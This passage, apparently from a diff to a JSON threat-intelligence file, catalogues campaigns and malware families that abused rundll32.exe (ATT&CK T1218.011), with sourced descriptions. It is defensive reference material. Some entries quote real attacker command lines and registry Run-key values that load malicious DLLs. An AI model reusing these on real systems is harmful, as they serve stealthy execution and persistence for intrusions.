+        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using `rundll32.exe`. During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called `vba_macro.exe`. This macro dropped `FONTCACHE.DAT`, the primary BlackEnergy implant; `rundll32.exe`, for executing the malware; `NTUSER.log`, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching `rundll32.exe`, which in-turn launches the malware and communicates with C2 servers over the Internet.. During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after `FONTCACHE.DAT`, `rundll32.exe`, and the associated.lnk file is delivered.",
+        "sources": "Booz Allen Hamilton https://www.boozallen.com/content/dam/boozallen/documents/2016/09/ukraine-report-when-the-lights-went-out.pdf"
+      },
+      {
+        "name": "C0015",
+        "attack_id": "C0015",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "During C0015, the threat actors loaded DLLs via `rundll32` using the `svchost` process. During C0015, the threat actors used `wmic` and `rundll32` to load Cobalt Strike onto a target host.",
+        "sources": "DFIR Conti Bazar Nov 2021 https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/"
+      },
+      {
+        "name": "C0018",
+        "attack_id": "C0018",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "During C0018, the threat actors used `rundll32` to run Mimikatz.",
+        "sources": "Costa AvosLocker May 2022 https://www.linkedin.com/pulse/raas-avoslocker-incident-response-analysis-fl%C3%A1vio-costa?trk=articles_directory"
+      },
+      {
+        "name": "C0021",
+        "attack_id": "C0021",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "During C0021, the threat actors used `rundll32.exe` to execute the Cobalt Strike Beacon loader DLL.",
+        "sources": "FireEye APT29 Nov 2018 https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html"
+      },
+      {
+        "name": "FunnyDream",
+        "attack_id": "C0007",
+        "evidence": "reported by Bitdefender FunnyDream Campaign November 2020",
+        "description": "The initialization.bat starts the dropper by running \"rundll32 \\\\<DC host>\\netlogon\\msvcrt.dll,Start\".",
+        "sources": "Bitdefender FunnyDream Campaign November 2020 https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "name": "Operation Dream Job",
+        "attack_id": "C0022",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "During Operation Dream Job, Lazarus Group executed malware with `C:\\windows\\system32\\rundll32.exe \"C:\\ProgramData\\ThumbNail\\thumbnail.db\"`, `CtrlPanel S-6-81-3811-75432205-060098-6872 0 0 905`.",
+        "sources": "ESET Lazarus Jun 2020 https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_Operation_Interception.pdf; McAfee Lazarus Jul 2020 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/operation-north-star-a-job-offer-thats-too-good-to-be-true/?hilite=%27Operation%27%2C%27North%27%2C%27Star%27; ClearSky Lazarus Aug 2020 https://www.clearskysec.com/wp-content/uploads/2020/08/Dream-Job-Campaign.pdf"
+      },
+      {
+        "name": "Operation Spalax",
+        "attack_id": "C0005",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "During Operation Spalax, the threat actors used `rundll32.exe` to execute malicious installers.",
+        "sources": "ESET Operation Spalax Jan 2021 https://www.welivesecurity.com/2021/01/12/operation-spalax-targeted-malware-attacks-colombia/"
+      },
+      {
+        "name": "SolarWinds Compromise",
+        "attack_id": "C0024",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "During the SolarWinds Compromise, APT29 used `Rundll32.exe` to execute payloads. During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with `rundll32.exe`.",
+        "sources": "Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/; Microsoft Deep Dive Solorigate January 2021 https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/; Microsoft 365 Defender Solorigate https://www.microsoft.com/security/blog/2020/12/28/using-microsoft-365-defender-to-coordinate-protection-against-solorigate/"
+      },
+      {
+        "name": "Water Curupira Pikabot Distribution",
+        "attack_id": "C0037",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Water Curupira Pikabot Distribution utilizes rundll32.exe to execute the final Pikabot payload, using the named exports `Crash` or `Limit` depending on the variant.",
+        "sources": "TrendMicro Pikabot 2024 https://www.trendmicro.com/en_us/research/24/a/a-look-into-pikabot-spam-wave-campaign.html"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "ADVSTORESHELL",
+        "attack_id": "S0045",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "ADVSTORESHELL has used rundll32.exe in a Registry value to establish persistence.",
+        "sources": "Bitdefender APT28 Dec 2015 https://download.bitdefender.com/resources/media/materials/white-papers/en/Bitdefender_In-depth_analysis_of_APT28%E2%80%93The_Political_Cyber-Espionage.pdf"
+      },
+      {
+        "name": "Attor",
+        "attack_id": "S0438",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Attor's installer plugin can schedule rundll32.exe to load the dispatcher.",
+        "sources": "ESET Attor Oct 2019 https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Attor.pdf"
+      },
+      {
+        "name": "Backdoor.Oldrea",
+        "attack_id": "S0093",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Backdoor.Oldrea can use rundll32 for execution on compromised hosts.",
+        "sources": "Gigamon Berserk Bear October 2021 https://vblocalhost.com/uploads/VB2021-Slowik.pdf"
+      },
+      {
+        "name": "Bad Rabbit",
+        "attack_id": "S0606",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Bad Rabbit has used rundll32 to launch a malicious DLL as C:Windowsinfpub.dat.",
+        "sources": "Secure List Bad Rabbit https://securelist.com/bad-rabbit-ransomware/82851/"
+      },
+      {
+        "name": "Bisonal",
+        "attack_id": "S0268",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Bisonal has used rundll32.exe to execute as part of the Registry Run key it adds: HKEY_CURRENT_USER \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\”vert” = “rundll32.exe c:\\windows\\temp\\pvcu.dll, Qszdez”.",
+        "sources": "Unit 42 Bisonal July 2018 https://researchcenter.paloaltonetworks.com/2018/07/unit42-bisonal-malware-used-attacks-russia-south-korea/"
+      },
+      {
+        "name": "BLINDINGCAN",
+        "attack_id": "S0520",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "BLINDINGCAN has used Rundll32 to load a malicious DLL.",
+        "sources": "US-CERT BLINDINGCAN Aug 2020 https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a"
+      },
+      {
+        "name": "BoomBox",
+        "attack_id": "S0635",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "BoomBox can use RunDLL32 for execution.",
+        "sources": "MSTIC Nobelium Toolset May 2021 https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/"
+      },
+      {
+        "name": "Briba",
+        "attack_id": "S0204",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.",
+        "sources": "Symantec Briba May 2012 https://www.symantec.com/security_response/writeup.jsp?docid=2012-051515-2843-99"
+      },
+      {
+        "name": "Bumblebee",
+        "attack_id": "S1039",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Bumblebee has used `rundll32` for execution of the loader component.",
+        "sources": "Symantec Bumblebee June 2022 https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/bumblebee-loader-cybercrime; Proofpoint Bumblebee April 2022 https://www.proofpoint.com/us/blog/threat-insight/bumblebee-is-still-transforming"
+      },
+      {
+        "name": "Cobalt Strike",
+        "attack_id": "S0154",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Cobalt Strike can use `rundll32.exe` to load DLL from the command line.",
+        "sources": "DFIR Conti Bazar Nov 2021 https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/; Trend Micro Black Basta October 2022 https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html; Cobalt Strike Manual 4.3 November 2020 https://web.archive.org/web/20210708035426/https://www.cobaltstrike.com/downloads/csmanual43.pdf"
+      },
+      {
+        "name": "Comnie",
+        "attack_id": "S0244",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Comnie uses Rundll32 to load a malicious DLL.",
+        "sources": "Palo Alto Comnie https://researchcenter.paloaltonetworks.com/2018/01/unit42-comnie-continues-target-organizations-east-asia/"
+      },
+      {
+        "name": "CORESHELL",
+        "attack_id": "S0137",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "CORESHELL is installed via execution of rundll32 with an export named \"init\" or \"InitW.\"",
+        "sources": "Microsoft SIR Vol 19 http://download.microsoft.com/download/4/4/C/44CDEF0E-7924-4787-A56A-16261691ACE3/Microsoft_Security_Intelligence_Report_Volume_19_English.pdf"
+      },
+      {
+        "name": "CozyCar",
+        "attack_id": "S0046",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "The CozyCar dropper copies the system file rundll32.exe to the install location for the malware, then uses the copy of rundll32.exe to load and execute the main CozyCar component. The CozyCar dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.",
+        "sources": "F-Secure CozyDuke https://www.f-secure.com/documents/996508/1030745/CozyDuke"
+      },
+      {
+        "name": "DDKONG",
+        "attack_id": "S0255",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "DDKONG uses Rundll32 to ensure only a single instance of itself is running at once.",
+        "sources": "Rancor Unit42 June 2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "name": "DEADEYE",
+        "attack_id": "S1052",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "DEADEYE can use `rundll32.exe` for execution of living off the land binaries (lolbin) such as `SHELL32.DLL`.",
+        "sources": "Mandiant APT41 https://www.mandiant.com/resources/apt41-us-state-governments"
+      },
+      {
+        "name": "Egregor",
+        "attack_id": "S0554",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Egregor has used rundll32 during execution.",
+        "sources": "Cybereason Egregor Nov 2020 https://www.cybereason.com/blog/cybereason-vs-egregor-ransomware"
+      },
+      {
+        "name": "Elise",
+        "attack_id": "S0081",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "After copying itself to a DLL file, a variant of Elise calls the DLL file using rundll32.exe.",
+        "sources": "Lotus Blossom Jun 2015 https://www.paloaltonetworks.com/resources/research/unit42-operation-lotus-blossom.html"
+      },
+      {
+        "name": "Emissary",
+        "attack_id": "S0082",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Variants of Emissary have used rundll32.exe in Registry values added to establish persistence.",
+        "sources": "Emissary Trojan Feb 2016 http://researchcenter.paloaltonetworks.com/2016/02/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/"
+      },
+      {
+        "name": "EnvyScout",
+        "attack_id": "S0634",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "EnvyScout has the ability to proxy execution of malicious files with Rundll32.",
+        "sources": "MSTIC Nobelium Toolset May 2021 https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/"
+      },
+      {
+        "name": "EVILNUM",
+        "attack_id": "S0568",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "EVILNUM can execute commands and scripts through rundll32.",
+        "sources": "Prevailion EvilNum May 2020 https://web.archive.org/web/20221209052853/https://www.prevailion.com/phantom-in-the-command-shell-2/"
+      },
+      {
+        "name": "FatDuke",
+        "attack_id": "S0512",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "FatDuke can execute via rundll32.",
+        "sources": "ESET Dukes October 2019 https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"
+      },
+      {
+        "name": "FELIXROOT",
+        "attack_id": "S0267",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "FELIXROOT uses Rundll32 for executing the dropper program. FELIXROOT deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.",
+        "sources": "ESET GreyEnergy Oct 2018 https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf; FireEye FELIXROOT July 2018 https://web.archive.org/web/20200607025424/https://www.fireeye.com/blog/threat-research/2018/07/microsoft-office-vulnerabilities-used-to-distribute-felixroot-backdoor.html"
+      },
+      {
+        "name": "Flame",
+        "attack_id": "S0143",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Rundll32.exe is used as a way of executing Flame at the command-line.",
+        "sources": "Crysys Skywiper https://www.crysys.hu/publications/files/skywiper.pdf"
+      },
+      {
+        "name": "FlawedAmmyy",
+        "attack_id": "S0381",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "FlawedAmmyy has used `rundll32` for execution.",
+        "sources": "Korean FSI TA505 2020 https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory="
+      },
+      {
+        "name": "FunnyDream",
+        "attack_id": "S1044",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "FunnyDream can use `rundll32` for execution of its components.",
+        "sources": "Bitdefender FunnyDream Campaign November 2020 https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf"
+      },
+      {
+        "name": "gh0st RAT",
+        "attack_id": "S0032",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "A gh0st RAT variant has used rundll32 for execution.",
+        "sources": "Arbor Musical Chairs Feb 2018 https://www.arbornetworks.com/blog/asert/musical-chairs-playing-tetris/"
+      },
+      {
+        "name": "GreyEnergy",
+        "attack_id": "S0342",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "GreyEnergy uses PsExec locally in order to execute rundll32.exe at the highest privileges (NTAUTHORITY\\SYSTEM).",
+        "sources": "ESET GreyEnergy Oct 2018 https://www.welivesecurity.com/wp-content/uploads/2018/10/ESET_GreyEnergy.pdf"
+      },
+      {
+        "name": "HermeticWizard",
+        "attack_id": "S0698",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "HermeticWizard has the ability to create a new process using `rundll32`.",
+        "sources": "ESET Hermetic Wizard March 2022 https://www.welivesecurity.com/2022/03/01/isaacwiper-hermeticwizard-wiper-worm-targeting-ukraine"
+      },
+      {
+        "name": "Heyoka Backdoor",
+        "attack_id": "S1027",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Heyoka Backdoor can use rundll32.exe to gain execution. Heyoka Backdoor can inject a DLL into rundll32.exe for execution.",
+        "sources": "SentinelOne Aoqin Dragon June 2022 https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/"
+      },
+      {
+        "name": "IcedID",
+        "attack_id": "S0483",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "IcedID has used rundll32.exe to execute the IcedID loader.",
+        "sources": "DFIR_Quantum_Ransomware https://thedfirreport.com/2022/04/25/quantum-ransomware/; Trendmicro_IcedID https://www.trendmicro.com/en_us/research/22/l/icedid-botnet-distributors-abuse-google-ppc-to-distribute-malware.html"
+      },
+      {
+        "name": "InvisiMole",
+        "attack_id": "S0260",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "InvisiMole has used rundll32.exe for execution.",
+        "sources": "ESET InvisiMole June 2020 https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf"
+      },
+      {
+        "name": "JHUHUGIT",
+        "attack_id": "S0044",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "JHUHUGIT is executed using rundll32.exe. JHUHUGIT has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.",
+        "sources": "F-Secure Sofacy 2015 https://labsblog.f-secure.com/2015/09/08/sofacy-recycles-carberp-and-metasploit-code/; Talos Seduploader Oct 2017 https://blog.talosintelligence.com/2017/10/cyber-conflict-decoy-document.html; ESET Sednit Part 1 http://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part1.pdf"
+      },
+      {
+        "name": "Kapeka",
+        "attack_id": "S1190",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Kapeka is a Windows DLL file executed via ordinal by `rundll32.exe`.",
+        "sources": "Microsoft KnuckleTouch 2024 https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Backdoor:Win64/KnuckleTouch.A!dha&threatId=-2147067254; WithSecure Kapeka 2024 https://labs.withsecure.com/content/dam/labs/docs/WithSecure-Research-Kapeka.pdf"
+      },
+      {
+        "name": "KONNI",
+        "attack_id": "S0356",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "KONNI has used Rundll32 to execute its loader for privilege escalation purposes.",
+        "sources": "Medium KONNI Jan 2020 https://medium.com/d-hunter/a-look-into-konni-2019-campaign-b45a0f321e9b; Malwarebytes Konni Aug 2021 https://blog.malwarebytes.com/threat-intelligence/2021/08/new-variant-of-konni-malware-used-in-campaign-targetting-russia/"
+      },
+      {
+        "name": "Kwampirs",
+        "attack_id": "S0236",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Kwampirs uses rundll32.exe in a Registry value added to establish persistence.",
+        "sources": "Symantec Orangeworm April 2018 https://www.symantec.com/blogs/threat-intelligence/orangeworm-targets-healthcare-us-europe-asia"
+      },
+      {
+        "name": "Latrodectus",
+        "attack_id": "S1160",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Latrodectus can use rundll32.exe to execute downloaded DLLs.",
+        "sources": "Bleeping Computer Latrodectus April 2024 https://www.bleepingcomputer.com/news/security/new-latrodectus-malware-attacks-use-microsoft-cloudflare-themes/; Elastic Latrodectus May 2024 https://www.elastic.co/security-labs/spring-cleaning-with-latrodectus"
+      },
+      {
+        "name": "Matryoshka",
+        "attack_id": "S0167",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Matryoshka uses rundll32.exe in a Registry Run key value for execution as part of its persistence mechanism.",
+        "sources": "CopyKittens Nov 2015 https://cdn2.hubspot.net/hubfs/1903456/Whitepapers/CopyKittens.pdf"
+      },
+      {
+        "name": "MegaCortex",
+        "attack_id": "S0576",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "MegaCortex has used rundll32.exe to load a DLL for file encryption. MegaCortex loads injecthelper.dll into a newly created rundll32.exe process.",
+        "sources": "IBM MegaCortex https://securityintelligence.com/posts/from-mega-to-giga-cross-version-comparison-of-top-megacortex-modifications/"
+      },
+      {
+        "name": "Mispadu",
+        "attack_id": "S1122",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Mispadu uses RunDLL32 for execution via its injector DLL.",
+        "sources": "ESET Security Mispadu Facebook Ads 2019 https://www.welivesecurity.com/2019/11/19/mispadu-advertisement-discounted-unhappy-meal/"
+      },
+      {
+        "name": "Mongall",
+        "attack_id": "S1026",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Mongall can use `rundll32.exe` for execution. Mongall can inject a DLL into `rundll32.exe` for execution.",
+        "sources": "SentinelOne Aoqin Dragon June 2022 https://www.sentinelone.com/labs/aoqin-dragon-newly-discovered-chinese-linked-apt-has-been-quietly-spying-on-organizations-for-10-years/"
+      },
+      {
+        "name": "Mosquito",
+        "attack_id": "S0256",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Mosquito's launcher uses rundll32.exe in a Registry Key value to start the main backdoor capability.",
+        "sources": "ESET Turla Mosquito Jan 2018 https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
+      },
+      {
+        "name": "NativeZone",
+        "attack_id": "S0637",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "NativeZone has used rundll32 to execute a malicious DLL.",
+        "sources": "SentinelOne NobleBaron June 2021 https://labs.sentinelone.com/noblebaron-new-poisoned-installers-could-be-used-in-supply-chain-attacks/"
+      },
+      {
+        "name": "Ninja",
+        "attack_id": "S1100",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Ninja loader components can be executed through rundll32.exe.",
+        "sources": "Kaspersky ToddyCat Check Logs October 2023 https://securelist.com/toddycat-keep-calm-and-check-logs/110696/"
+      },
+      {
+        "name": "NOKKI",
+        "attack_id": "S0353",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "NOKKI has used rundll32 for execution.",
+        "sources": "Unit 42 NOKKI Sept 2018 https://researchcenter.paloaltonetworks.com/2018/09/unit42-new-konni-malware-attacking-eurasia-southeast-asia/"
+      },
+      {
+        "name": "NotPetya",
+        "attack_id": "S0368",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "NotPetya uses rundll32.exe to install itself on remote systems when accessed via PsExec or wmic.",
+        "sources": "Talos Nyetya June 2017 https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html"
+      },
+      {
+        "name": "PolyglotDuke",
+        "attack_id": "S0518",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "PolyglotDuke can be executed using rundll32.exe.",
+        "sources": "ESET Dukes October 2019 https://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf"
+      },
+      {
+        "name": "PowerDuke",
+        "attack_id": "S0139",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "PowerDuke uses rundll32.exe to load.",
+        "sources": "Volexity PowerDuke November 2016 https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/"
+      },
+      {
+        "name": "Prikormka",
+        "attack_id": "S0113",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Prikormka uses rundll32.exe to load its DLL.",
+        "sources": "ESET Operation Groundbait http://www.welivesecurity.com/wp-content/uploads/2016/05/Operation-Groundbait.pdf"
+      },
+      {
+        "name": "Pteranodon",
+        "attack_id": "S0147",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Pteranodon executes functions using rundll32.exe.",
+        "sources": "Palo Alto Gamaredon Feb 2017 https://researchcenter.paloaltonetworks.com/2017/02/unit-42-title-gamaredon-group-toolset-evolution/"
+      },
+      {
+        "name": "PUNCHBUGGY",
+        "attack_id": "S0196",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "PUNCHBUGGY can load a DLL using Rundll32.",
+        "sources": "FireEye Know Your Enemy FIN8 Aug 2016 https://www2.fireeye.com/WBNR-Know-Your-Enemy-UNC622-Spear-Phishing.html"
+      },
+      {
+        "name": "QakBot",
+        "attack_id": "S0650",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "QakBot has used Rundll32.exe to drop malicious DLLs including Brute Ratel C4 and to enable C2 communication.",
+        "sources": "Crowdstrike Qakbot October 2020 https://www.crowdstrike.com/blog/duck-hunting-with-falcon-complete-qakbot-zip-based-campaign/; Cyberint Qakbot May 2021 https://blog.cyberint.com/qakbot-banking-trojan; Trend Micro Black Basta October 2022 https://www.trendmicro.com/en_us/research/22/j/black-basta-infiltrates-networks-via-qakbot-brute-ratel-and-coba.html; ATT QakBot April 2021 https://cybersecurity.att.com/blogs/labs-research/the-rise-of-qakbot; Red Canary Qbot https://redcanary.com/threat-detection-report/threats/qbot/"
+      },
+      {
+        "name": "Ragnar Locker",
+        "attack_id": "S0481",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Ragnar Locker has used rundll32.exe to execute components of VirtualBox.",
+        "sources": "Sophos Ragnar May 2020 https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/"
+      },
+      {
+        "name": "Raspberry Robin",
+        "attack_id": "S1130",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Raspberry Robin uses rundll32 execution without any command line parameters to contact command and control infrastructure, such as IP addresses associated with Tor nodes. Raspberry Robin will use a Registry key to achieve persistence through reboot, setting a RunOnce key such as: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce {random value name} = “rundll32 shell32 ShellExec_RunDLLA REGSVR /u /s “{dropped copy path and file name}”” . Raspberry Robin will execute its payload prior to initializing command and control traffic by impersonating one of several legitimate program names such as dllhost.exe, regsvr32.exe, or rundll32.exe.",
+        "sources": "RedCanary RaspberryRobin 2022 https://redcanary.com/blog/threat-intelligence/raspberry-robin/; TrendMicro RaspberryRobin 2022 https://www.trendmicro.com/en_us/research/22/l/raspberry-robin-malware-targets-telecom-governments.html"
+      },
+      {
+        "name": "RTM",
+        "attack_id": "S0148",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "RTM runs its core DLL file using rundll32.exe. RTM uses the command line and rundll32.exe to execute.",
+        "sources": "ESET RTM Feb 2017 https://www.welivesecurity.com/wp-content/uploads/2017/02/Read-The-Manual.pdf; Unit42 Redaman January 2019 https://unit42.paloaltonetworks.com/russian-language-malspam-pushing-redaman-banking-malware/"
+      },
+      {
+        "name": "Sakula",
+        "attack_id": "S0074",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Sakula calls cmd.exe to run various DLL files via rundll32. Sakula calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup. Sakula also has the capability to invoke a reverse shell.",
+        "sources": "Dell Sakula http://www.secureworks.com/cyber-threat-intelligence/threats/sakula-malware-family/"
+      },
+      {
+        "name": "SDBbot",
+        "attack_id": "S0461",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "SDBbot has used rundll32.exe to execute DLLs. SDBbot has the ability to inject a downloaded DLL into a newly created rundll32.exe process.",
+        "sources": "Korean FSI TA505 2020 https://www.fsec.or.kr/user/bbs/fsec/163/344/bbsDataView/1382.do?page=1&column=&search=&searchSDate=&searchEDate=&bbsDataCategory=; Proofpoint TA505 October 2019 https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader"
+      },
+      {
+        "name": "ServHelper",
+        "attack_id": "S0382",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "ServHelper contains a module for downloading and executing DLLs that leverages rundll32.exe.",
+        "sources": "Deep Instinct TA505 Apr 2019 https://www.deepinstinct.com/blog/new-servhelper-variant-employs-excel-4-0-macro-to-drop-signed-payload"
+      },
+      {
+        "name": "Sibot",
+        "attack_id": "S0589",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Sibot has executed downloaded DLLs with rundll32.exe.",
+        "sources": "MSTIC NOBELIUM Mar 2021 https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
+      },
+      {
+        "name": "Squirrelwaffle",
+        "attack_id": "S1030",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Squirrelwaffle has been executed using `rundll32.exe`.",
+        "sources": "ZScaler Squirrelwaffle Sep 2021 https://www.zscaler.com/blogs/security-research/squirrelwaffle-new-loader-delivering-cobalt-strike; Netskope Squirrelwaffle Oct 2021 https://www.netskope.com/blog/squirrelwaffle-new-malware-loader-delivering-cobalt-strike-and-qakbot"
+      },
+      {
+        "name": "StreamEx",
+        "attack_id": "S0142",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "StreamEx uses rundll32 to call an exported function.",
+        "sources": "Cylance Shell Crew Feb 2017 https://www.cylance.com/shell-crew-variants-continue-to-fly-under-big-avs-radar"
+      },
+      {
+        "name": "StrelaStealer",
+        "attack_id": "S1183",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "StrelaStealer DLL payloads have been executed via `rundll32.exe`.",
+        "sources": "PaloAlto StrelaStealer 2024 https://unit42.paloaltonetworks.com/strelastealer-campaign/; IBM StrelaStealer 2024 https://securityintelligence.com/x-force/strela-stealer-todays-invoice-tomorrows-phish/"
+      },
+      {
+        "name": "SUNBURST",
+        "attack_id": "S0559",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "SUNBURST used Rundll32 to execute payloads.",
+        "sources": "Microsoft Deep Dive Solorigate January 2021 https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/"
+      },
+      {
+        "name": "SVCReady",
+        "attack_id": "S1064",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "SVCReady has used `rundll32.exe` for execution.",
+        "sources": "HP SVCReady Jun 2022 https://threatresearch.ext.hp.com/svcready-a-new-loader-reveals-itself/"
+      },
+      {
+        "name": "Troll Stealer",
+        "attack_id": "S1196",
+        "evidence": "uses T1218.011; names rundll32.exe",
+        "description": "Troll Stealer is dropped as a DLL file and executed via `rundll32.exe` by its installer.",
+        "sources": "ASEC Troll Stealer 2024 https://asec.ahnlab.com/en/61934/; S2W Troll Stealer 2024 https://medium.com/s2wblog/kimsuky-disguised-as-a-korean-company-signed-with-a-valid-certificate-to-distribute-troll-stealer-cfa5d54314e2"
+      },
+      {
+        "name": "USBferry",
+        "attack_id": "S0452",
+        "evidence": "uses T1218.011; names rundll32.exe",
